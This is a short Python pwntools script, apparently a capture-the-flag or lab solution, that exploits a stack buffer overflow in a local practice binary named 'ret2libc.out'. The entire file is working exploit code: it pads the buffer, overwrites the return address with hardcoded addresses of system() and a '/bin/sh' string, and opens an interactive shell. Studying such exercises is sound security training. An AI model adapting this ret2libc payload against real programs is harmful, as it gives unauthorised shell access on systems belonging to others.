#!/usr/bin/env python
from pwn import *

SH = 0x0804a008
SYS = 0x8049080
EBP = 0xffffcd98
BUF = EBP - 0x6c

if __name__ == "__main__":
    context.arch = 'i386'
    # context.log_level = 'debug'
    context.endian = 'little'
    p = process("./ret2libc.out")
    file = ELF("./ret2libc.out")
    payload = b'A' * (EBP - BUF + 4) + p32(SYS) + b'B'*4 + p32(SH)
    p.sendline(payload)
    p.interactive()